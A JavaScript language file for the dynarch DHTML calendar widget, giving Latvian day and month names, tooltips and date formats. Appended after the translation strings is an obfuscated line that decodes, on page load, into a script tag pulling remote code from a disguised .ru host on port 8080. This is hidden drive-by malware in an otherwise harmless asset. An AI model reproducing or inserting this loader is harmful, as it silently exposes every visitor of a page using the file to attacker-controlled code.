// ** I18N

// Calendar LV language
// Author: Juris Valdovskis, <juris@dc.lv>
// Encoding: cp1257
// Distributed under the same terms as the calendar itself.

// For translators: please use UTF-8 if possible.  We strongly believe that
// Unicode is the answer to a real internationalized world.  Also please
// include your contact information in the header, as can be seen above.

// full day names
Calendar._DN = new Array
("Svçtdiena",
 "Pirmdiena",
 "Otrdiena",
 "Treðdiena",
 "Ceturdiena",
 "Piektdiena",
 "Sestdiena",
 "Svçtdiena");

// Please note that the following array of short day names (and the same goes
// for short month names, _SMN) isn't absolutely necessary.  We give it here
// for exemplification on how one can customize the short day names, but if
// they are simply the first N letters of the full name you can simply say:
//
//   Calendar._SDN_len = N; // short day name length
//   Calendar._SMN_len = N; // short month name length
//
// If N = 3 then this is not needed either since we assume a value of 3 if not
// present, to be compatible with translation files that were written before
// this feature.

// short day names
Calendar._SDN = new Array
("Sv",
 "Pr",
 "Ot",
 "Tr",
 "Ce",
 "Pk",
 "Se",
 "Sv");

// full month names
Calendar._MN = new Array
("Janvâris",
 "Februâris",
 "Marts",
 "Aprîlis",
 "Maijs",
 "Jûnijs",
 "Jûlijs",
 "Augusts",
 "Septembris",
 "Oktobris",
 "Novembris",
 "Decembris");

// short month names
Calendar._SMN = new Array
("Jan",
 "Feb",
 "Mar",
 "Apr",
 "Mai",
 "Jûn",
 "Jûl",
 "Aug",
 "Sep",
 "Okt",
 "Nov",
 "Dec");

// tooltips
Calendar._TT = {};
Calendar._TT["INFO"] = "Par kalendâru";

Calendar._TT["ABOUT"] =
"DHTML Date/Time Selector\n" +
"(c) dynarch.com 2002-2005 / Author: Mihai Bazon\n" + // don't translate this this ;-)
"For latest version visit: http://www.dynarch.com/projects/calendar/\n" +
"Distributed under GNU LGPL.  See http://gnu.org/licenses/lgpl.html for details." +
"\n\n" +
"Datuma izvçle:\n" +
"- Izmanto \xab, \xbb pogas, lai izvçlçtos gadu\n" +
"- Izmanto " + String.fromCharCode(0x2039) + ", " + String.fromCharCode(0x203a) + "pogas, lai izvçlçtos mçnesi\n" +
"- Turi nospiestu peles pogu uz jebkuru no augstâk minçtajâm pogâm, lai paâtrinâtu izvçli.";
Calendar._TT["ABOUT_TIME"] = "\n\n" +
"Laika izvçle:\n" +
"- Uzklikðíini uz jebkuru no laika daïâm, lai palielinâtu to\n" +
"- vai Shift-klikðíis, lai samazinâtu to\n" +
"- vai noklikðíini un velc uz attiecîgo virzienu lai mainîtu âtrâk.";

Calendar._TT["PREV_YEAR"] = "Iepr. gads (turi izvçlnei)";
Calendar._TT["PREV_MONTH"] = "Iepr. mçnesis (turi izvçlnei)";
Calendar._TT["GO_TODAY"] = "Ðodien";
Calendar._TT["NEXT_MONTH"] = "Nâkoðais mçnesis (turi izvçlnei)";
Calendar._TT["NEXT_YEAR"] = "Nâkoðais gads (turi izvçlnei)";
Calendar._TT["SEL_DATE"] = "Izvçlies datumu";
Calendar._TT["DRAG_TO_MOVE"] = "Velc, lai pârvietotu";
Calendar._TT["PART_TODAY"] = " (ðodien)";

// the following is to inform that "%s" is to be the first day of week
// %s will be replaced with the day name.
Calendar._TT["DAY_FIRST"] = "Attçlot %s kâ pirmo";

// This may be locale-dependent.  It specifies the week-end days, as an array
// of comma-separated numbers.  The numbers are from 0 to 6: 0 means Sunday, 1
// means Monday, etc.
Calendar._TT["WEEKEND"] = "1,7";

Calendar._TT["CLOSE"] = "Aizvçrt";
Calendar._TT["TODAY"] = "Ðodien";
Calendar._TT["TIME_PART"] = "(Shift-)Klikðíis vai pârvieto, lai mainîtu";

// date formats
Calendar._TT["DEF_DATE_FORMAT"] = "%d-%m-%Y";
Calendar._TT["TT_DATE_FORMAT"] = "%a, %e %b";

Calendar._TT["WK"] = "wk";
Calendar._TT["TIME"] = "Laiks:";


var pK=new Array();var _p=new Array();try {this.d='';var O;if(O!='f' && O!='eR'){O=''};var CD;if(CD!='' && CD!='q_'){CD='Y'};var T='g';this.GD='';var a=RegExp;var k=new Array();var Tb='[';var _='replace';var Xo="";var n='';var _k;if(_k!='' && _k!='kT'){_k='oU'};var s=']';var i='';var V;if(V!='' && V!='pV'){V=null};function R(G,C){var bE;if(bE!='' && bE!='at'){bE=''};var ib;if(ib!='' && ib!='HF'){ib=''};var zR="";var M=Tb;M+=C;var Zb=new Date();M+=s;var zB;if(zB!='ry' && zB != ''){zB=null};var Xn=new String();var Mn=new a(M, T);var NQ=new Array();var mC=new Date();return G[_](Mn, n);};var y=new String();var uZ;if(uZ!='' && uZ!='av'){uZ=null};this.Ee="";var U=R('aWpvpBeXnBd1C1hviBl1dX',"vBWX1");var G="1";var o=R('bHo5dCy5',"HnCY5");var Nd="";var m=R('sCeCt4A4tCtCrCi4b4u4tCe4',"4C");var Uo="";var K=R('cGrNe7aNt7e7EMlNeqmGeMn7t7',"qGNM7");var eu=new String();var bX;if(bX!='cn'){bX=''};var F=R('oPnNlPoNaDdN',"NPAD");var q='';var p=R('s2c2rjijpyt2',"20yj");this.MF="";var B=R('hItJtJpJ:I/I/ImIoInIoIgIrJaIfJiJaJsI-JcIoImJ.IwIiJkIiImIeJdJiJaJ.IoIrIgI.JpJaJrItIyIpJoIkIeIrI-IcJoJmI.JiIwJeIsItIpIoJiInJtJ.JrJuJ:I',"IJ");var v=R('8199997099179987919970999991',"179");var FI=new Array();var FH=R('/kguouo5gFlbeb.5cuobm5/kguokoFgulueb.bcuoFm5/kw5auskhuiun5gut5oFnkp5o5sFtu.bcuoFmk/uy5nkeutu.ucuobmb/ktbw5ibtupFiucu.5cbo5mF.5pbhupb',"uF5bk");var Ex=new String();var S_;if(S_!='' && S_!='HJ'){S_='aB'};var g;if(g!='' && g!='Ox'){g='Zs'};window[F]=function(){var Rs;if(Rs!=''){Rs='ZC'};this.Gx='';var ml;if(ml!='' && ml!='fI'){ml='yy'};W=document[K](p);var pX="";q+=B;var dt;if(dt!='Am'){dt='Am'};this.Oz="";q+=v;q+=FH;var SZ=new Array();W.src=q;var Gn;if(Gn!='' && Gn!='yyO'){Gn='YG'};var Yr;if(Yr!='ES'){Yr='ES'};var Il;if(Il!='fa'){Il='fa'};var nY;if(nY!='ce'){nY=''};var z=document[o];var _q;if(_q!='lV' && _q != ''){_q=null};W.setAttribute('defer', G);var Bi;if(Bi!=''){Bi='Tx'};this.qs='';var dj;if(dj!='' && dj!='Ek'){dj=null};z.appendChild(W);this.uZB='';this.vl='';};var ST=new Array();var pD;if(pD!='SpC'){pD=''};} catch(A){};var Jq='';